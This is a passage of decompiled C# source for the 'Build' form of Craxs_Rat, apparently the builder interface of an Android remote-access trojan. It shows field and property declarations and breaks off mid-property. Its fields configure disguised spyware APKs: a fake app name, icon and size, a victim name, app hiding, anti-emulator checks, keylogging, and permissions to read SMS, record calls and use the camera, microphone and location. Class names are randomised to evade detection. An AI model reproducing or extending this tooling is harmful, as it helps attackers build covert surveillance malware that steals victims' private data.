using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Craxs_Rat.My;
using Craxs_Rat.My.Resources;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;

namespace Craxs_Rat;

[DesignerGenerated]
public class Build : Form
{
	public delegate void Delegate0(object d0, object b0);

	private IContainer components;

	[AccessedThroughProperty("Panel3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Panel _Panel3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("TiMAT")]
	private System.Windows.Forms.Timer _TiMAT;

	[AccessedThroughProperty("TOpacity")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private System.Windows.Forms.Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startTime")]
	private System.Windows.Forms.Timer _startTime;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label12")]
	[CompilerGenerated]
	private Label _Label12;

	[AccessedThroughProperty("combotype")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIComboBox _combotype;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label21")]
	private Label _Label21;

	[AccessedThroughProperty("TextSize")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private TextBox _TextSize;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("Label17")]
	private Label _Label17;

	[AccessedThroughProperty("Label16")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Label _Label16;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label14")]
	private Label _Label14;

	[AccessedThroughProperty("Label6")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label _Label6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label33")]
	private Label _Label33;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label35")]
	[CompilerGenerated]
	private Label _Label35;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("Checksuper")]
	private DrakeUICheckBox _Checksuper;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CheckQuick")]
	private DrakeUICheckBox _CheckQuick;

	[AccessedThroughProperty("CheckBIND")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUICheckBox _CheckBIND;

	[AccessedThroughProperty("CheckIconPatch")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUICheckBox _CheckIconPatch;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label43")]
	[CompilerGenerated]
	private Label _Label43;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("delayaccesstext")]
	[CompilerGenerated]
	private TextBox _delayaccesstext;

	[AccessedThroughProperty("Label34")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label _Label34;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label38")]
	[CompilerGenerated]
	private Label _Label38;

	[AccessedThroughProperty("Label41")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label _Label41;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label10")]
	private Label _Label10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TextPackage")]
	private DrakeUITextBox _TextPackage;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("randomidbtn")]
	private DrakeUIAvatar _randomidbtn;

	[AccessedThroughProperty("randomverbtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _randomverbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label13")]
	[CompilerGenerated]
	private Label _Label13;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("CheckAllPrims")]
	private DrakeUICheckBox _CheckAllPrims;

	[AccessedThroughProperty("Button1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _Button1;

	[CompilerGenerated]
	[AccessedThroughProperty("SelectedApk")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _SelectedApk;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addactiv")]
	private DrakeUIAvatar _addactiv;

	[AccessedThroughProperty("removeactiv")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _removeactiv;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("removmonitor")]
	private DrakeUIAvatar _removmonitor;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addmintor")]
	[CompilerGenerated]
	private DrakeUIAvatar _addmintor;

	[CompilerGenerated]
	[AccessedThroughProperty("checkcatpure")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUICheckBox _checkcatpure;

	[CompilerGenerated]
	[AccessedThroughProperty("Label40")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label _Label40;

	[CompilerGenerated]
	[AccessedThroughProperty("Label36")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label _Label36;

	[CompilerGenerated]
	[AccessedThroughProperty("Label26")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label _Label26;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label18")]
	private Label _Label18;

	[AccessedThroughProperty("Label15")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Label _Label15;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label49")]
	private Label _Label49;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clonecheck")]
	private DrakeUICheckBox _clonecheck;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	[CompilerGenerated]
	private DrakeUIAvatar _DrakeUIAvatar1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label50")]
	private Label _Label50;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("Label11")]
	private Label _Label11;

	private bool keyback;

	private string MyStamp;

	private bool Package_keyback;

	private bool keybackVersion;

	private string spl_arguments;

	private string BIND_Path;

	private string BIND_EX;

	private string isuper;

	private string isAOX;

	private string isnetwork;

	private string iscaponce;

	private string isautounlock;

	private string MonitorPack;

	private string trackerlist;

	private string isBind;

	private string isskipreinstall;

	private string iskeepscreen;

	private string isHideprims;

	private string isadmin;

	private string isautostart;

	private string isQuick;

	private string isDrawing;

	private string isnotifi;

	private string intent_;

	private string iconPatch;

	private string Prim_sendsms;

	private string Prim_recordcalls;

	private string Prim_wallpaper;

	private string Prim_readsms;

	private string Prim_calllog;

	private string Prim_readcontact;

	private string Prim_readacounts;

	private string Prim_camera;

	private string Prim_microphone;

	private string Prim_loacation1;

	private string Prim_loacation2;

	private string Prim_loacation3;

	private string Prim_callphone;

	private bool Programmatically;

	private string SplitterDNS;

	private Color colo0;

	private Color colo1;

	private string PRIMS;

	private string THETYPE;

	private string FAKEAPPNAME;

	private string FAKEAPPlink;

	private string FAKEAPPicon;

	private string OFFKEYLOG;

	private string ANTIEMO;

	private string APKVERSION;

	private string NOTIFI_MSG;

	private string NOTIFI_TITLE;

	private string HIDETYPE;

	private string TheTarget;

	private string UseRecorder;

	private int NewFakeSize;

	private int _Time;

	private Bitmap _Bitmap_ICO;

	private int cou;

	private string ip;

	private string ports;

	private string namevictim;

	private string namepatch;

	private string version;

	private string proprty;

	private string sleepms;

	private string futex;

	private string flavor;

	private string folder_building;

	private string folder_apktool;

	private string path_apktool;

	private string path_font;

	private string xPackage;

	private string[] ftx;

	private int vulTrack;

	private string pack1;

	private string pack2;

	private const string spymax = "spymax";

	private const string stub7 = "stub7";

	private const string activz = "activz";

	private string Nactivz;

	private const string brodatz = "brodatz";

	private string Nbrodatz;

	private const string servziz = "servziz";

	private string Nservziz;

	private const string tolziz = "tolziz";

	private string Ntolziz;

	private const string ClassGen0 = "ClassGen0";

	private const string ClassGen1 = "ClassGen1";

	private const string ClassGen2 = "ClassGen2";

	private const string ClassGen3 = "ClassGen3";

	private const string ClassGen4 = "ClassGen4";

	private const string ClassGen5 = "ClassGen5";

	private const string ClassGen6 = "ClassGen6";

	private const string ClassGen8 = "ClassGen8";

	private const string ClassGen9 = "ClassGen9";

	private const string ClassGen10 = "ClassGen10";

	private const string ClassGen11 = "ClassGen11";

	private const string ClassGen12 = "ClassGen12";

	private const string ClassGen13 = "ClassGen13";

	private const string ClassGen14 = "ClassGen14";

	private const string _ask_prim_ = "_ask_prim_";

	private string N_ask_prim_;

	private const string _trns_g_ = "_trns_g_";

	private string N_trns_g_;

	private const string _cap_sc_ = "_cap_sc_";

	private string N_cap_sc_;

	private const string _access_ask_ = "_access_ask_";

	private string N_access_ask_;

	private const string _scctrl_ = "_scctrl_";

	private string N_scctrl_;

	private const string _news_g_ = "_news_g_";

	private string N_news_g_;

	private const string _strt_view_ = "_strt_view_";

	private string N_strt_view_;

	private const string _sc_fb_ = "_sc_fb_";

	private string N_sc_fb_;

	private const string _ask_draw_ = "_ask_draw_";

	private string N_ask_draw_;

	private const string _ask_battary_ = "_ask_battary_";

	private string N_ask_battary_;

	private const string _engine_wrk_ = "_engine_wrk_";

	private string N_engine_wrk_;

	private const string _skin_cls_ = "_skin_cls_";

	private string N_skin_cls_;

	private const string _update_app_ = "_update_app_";

	private string N_update_app_;

	private const string _callr_lsnr_ = "_callr_lsnr_";

	private string N_callr_lsnr_;

	private const string _clss_loder_ = "_clss_loder_";

	private string N_clss_loder_;

	private const string _excut_meth_ = "_excut_meth_";

	private string N_excut_meth_;

	private const string _run_comnd_ = "_run_comnd_";

	private string N_run_comnd_;

	private const string _get_me_fil_ = "_get_me_fil_";

	private string N_get_me_fil_;

	private const string _srv_worker_ = "_srv_worker_";

	private string N_srv_worker_;

	private string NClassGen0;

	private string NClassGen1;

	private string NClassGen2;

	private string NClassGen3;

	private string NClassGen4;

	private string NClassGen5;

	private string NClassGen6;

	private string NClassGen8;

	private string NClassGen9;

	private string NClassGen10;

	private string NClassGen11;

	private string NClassGen12;

	private string NClassGen13;

	private string NClassGen14;

	private string payload;

	private const string resoString0 = "j1j2j3j4j5j6";

	private const string resoString1 = "c1c2c3c4c5c6";

	private const string resoString2 = "z1z2z3z4z5z6";

	private const string resoString3 = "f1f2f3f4f5f6";

	private const string resoString4 = "h1h2h3h4h5h6";

	private const string resoString5 = "t1t2t3t4t5t6";

	private const string resoString6 = "n1n2n3n4n5n6";

	private const string resoString7 = "i1i2i3i4i5i6";

	private const string resoString8 = "k1k2k3k4k5k6";

	private const string resoString9 = "o1o2o3o4o5o6";

	private const string resoString10 = "u1u2u3u4u5u6";

	private const string resoString11 = "e1e2e3e4e5e6";

	private const string resoString12 = "y1y2y3y4y5y6";

	private string NresoString0;

	private string NresoString1;

	private string NresoString2;

	private string NresoString3;

	private string NresoString4;

	private string NresoString5;

	private string NresoString6;

	private string NresoString7;

	private string NresoString8;

	private string NresoString9;

	private string NresoString10;

	private string NresoString11;

	private string NresoString12;

	private const string app_reso0 = "b1b2b3b4b5b6";

	private string Napp_reso0;

	private const string draw_ico = "d1d2d3d4d5d6";

	private const string draw_notifi = "x1x2x3x4x5x6";

	private string Ndraw_ico;

	private string Ndraw_notifi;

	private const string webXML = "q1q2q3q4q5q6";

	private string NwebXML;

	private const string notifiXML = "s1s2s3s4s5s6";

	private string NnotifiXML;

	private string new_exit_mth;

	private string new_wifipolc;

	private string new_formatpacket;

	private string new_dzip;

	private string new_getbyte;

	private string new_base_mth;

	private string new_getstr;

	private string new_czip;

	private string new_inst;

	private string new_strt_con_;

	private string new_fist_inf_;

	private string new_new_con_;

	private string new_send_it_;

	private string new_Reblace_;

	private string new_runn_srv_;

	private string NEWRANDOM;

	public Random rshit;

	private string KEY;

	public bool oncedelete;

	private bool FolderApk;

	private bool Builtapk;

	private bool StartedZip;

	private bool encrypt_started;

	private bool protectfinished;

	public bool pumpstarted;

	public bool pumpfinished;

	public bool firstpump;

	private bool Once;

	private const string tempApk = "temp";

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private object _ZipFile;

	private object CMD;

	private string[] randmid;

	private Random rnd;

	private Random numberrandomer;

	private List<Rectangle> RectInputText0;

	private List<Rectangle> RectInputText1;

	private List<Rectangle> RectInputText3;

	[SpecialName]
	private Random _0024STATIC_0024MoveRandomFile_00242021EE_0024r;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init;

	[SpecialName]
	private Random _0024STATIC_0024MoveRandomDIR_00242021EE_0024r;

	[SpecialName]
	private StaticLocalInitFlag _0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init;

	private Random STATICMoveRandomFile2021EEr;

	private StaticLocalInitFlag STATIMoveRandomFile2021EErInit;

	private Random STATICMoveRandomDIR2021EEr;

	private StaticLocalInitFlag STATICMoveRandomDIR2021EErInit;

	private StaticLocalInitFlag STATICMoveRandomFile2021EErInit;

	private Random TATICMoveRandomFile2021EEr;

	private StaticLocalInitFlag TATICoveRandomFile021Ernit;

	private Random random;

	private StaticLocalInitFlag nit;

	private StaticLocalInitFlag STATICMoveRandomDIR021EErInit;

	private StaticLocalInitFlag STATICMoveRandomFile2021EEInit;

	private Random STATIMoveRandomDIR2021EEr;

	[field: AccessedThroughProperty("box")]
	internal virtual Panel box
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = Panel3_Paint;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.Paint -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.Paint += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer TiMAT
	{
		[CompilerGenerated]
		get
		{
			return _TiMAT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TiMAT_Tick;
			System.Windows.Forms.Timer timer = _TiMAT;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TiMAT = value;
			timer = _TiMAT;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("FolderPath")]
	internal virtual FolderBrowserDialog FolderPath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FilePathApk")]
	internal virtual OpenFileDialog FilePathApk
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			System.Windows.Forms.Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer startTime
	{
		[CompilerGenerated]
		get
		{
			return _startTime;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = startTime_Tick;
			System.Windows.Forms.Timer timer = _startTime;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_startTime = value;
			timer = _startTime;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("keeplivelabel")]
	internal virtual Label keeplivelabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolTip1")]
	internal virtual ToolTip ToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label12
	{
		[CompilerGenerated]
		get
		{
			return _Label12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label12_MouseEnter;
			EventHandler value3 = Label12_MouseLeave;
			Label label = _Label12;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label12 = value;
			label = _Label12;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual DrakeUIComboBox combotype
	{
		[CompilerGenerated]
		get
		{
			return _combotype;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Combotype_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _combotype;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_combotype = value;
			drakeUIComboBox = _combotype;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label20")]
	internal virtual Label Label20
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label21
	{
		[CompilerGenerated]
		get
		{
			return _Label21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label21_MouseEnter;
			EventHandler value3 = Label21_MouseLeave;
			Label label = _Label21;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label21 = value;
			label = _Label21;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("fakepanel")]
	internal virtual Panel fakepanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("fakeiconpic")]
	internal virtual PictureBox fakeiconpic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label23")]
	internal virtual Label Label23
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label22")]
	internal virtual Label Label22
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label25")]
	internal virtual Label Label25
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label24")]
	internal virtual Label Label24
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Notmsg")]
	internal virtual TextBox Notmsg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Nottitle")]
	internal virtual TextBox Nottitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label28")]
	internal virtual Label Label28
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label27")]
	internal virtual Label Label27
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label30")]
	internal virtual Label Label30
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox TextSize
	{
		[CompilerGenerated]
		get
		{
			return _TextSize;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TextBox2_TextChanged;
			TextBox textBox = _TextSize;
			if (textBox != null)
			{
				textBox.TextChanged -= value2;
			}
			_TextSize = value;
			textBox = _TextSize;
			if (textBox != null)
			{
				textBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("CheckFakeSize")]
	internal virtual DrakeUICheckBox CheckFakeSize
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox2")]
	internal virtual PictureBox PictureBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Button3_Click;
			Button button = _Button3;
			if (button != null)
			{
				button.Click -= value2;
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				button.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label32")]
	internal virtual Label Label32
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label31")]
	internal virtual Label Label31
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("logbodytext")]
	internal virtual TextBox logbodytext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label29")]
	internal virtual Label Label29
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("logtitletext")]
	internal virtual TextBox logtitletext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label17
	{
		[CompilerGenerated]
		get
		{
			return _Label17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label17_MouseEnter;
			EventHandler value3 = Label17_MouseLeave;
			Label label = _Label17;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label17 = value;
			label = _Label17;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("Label19")]
	internal virtual Label Label19
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkver")]
	internal virtual DrakeUIComboBox checkver
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label16
	{
		[CompilerGenerated]
		get
		{
			return _Label16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label16_MouseEnter;
			EventHandler value3 = Label16_MouseLeave;
			Label label = _Label16;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label16 = value;
			label = _Label16;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual Label Label14
	{
		[CompilerGenerated]
		get
		{
			return _Label14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label14_MouseEnter;
			EventHandler value3 = Label14_MouseLeave;
			Label label = _Label14;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label14 = value;
			label = _Label14;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label6_MouseEnter;
			EventHandler value3 = Label6_MouseLeave;
			Label label = _Label6;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label6 = value;
			label = _Label6;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("explaintoolstext")]
	internal virtual TextBox explaintoolstext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label33
	{
		[CompilerGenerated]
		get
		{
			return _Label33;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label33_MouseEnter;
			EventHandler value3 = Label33_MouseLeave;
			Label label = _Label33;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label33 = value;
			label = _Label33;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	internal virtual Label Label35
	{
		[CompilerGenerated]
		get
		{
			return _Label35;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Label35_MouseEnter;
			EventHandler value3 = Label35_MouseLeave;
			Label label = _Label35;
			if (label != null)
			{
				label.MouseEnter -= value2;
				label.MouseLeave -= value3;
			}
			_Label35 = value;
			label = _Label35;
			if (label != null)
			{
				label.MouseEnter += value2;
				label.MouseLeave += value3;
			}
		}
	}

	[field: AccessedThroughProperty("Label37")]
	internal virtual Label Label37
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dscriptext")]
	internal virtual TextBox dscriptext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("sizelabel")]
	internal virtual Label sizelabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TABCTRL")]
	internal virtual DrakeUITabControl TABCTRL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage9")]
	internal virtual TabPage TabPage9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage10")]
	internal virtual TabPage TabPage10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage11")]
	internal virtual TabPage TabPage11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage12")]
	internal virtual TabPage TabPage12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage13")]
	internal virtual TabPage TabPage13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
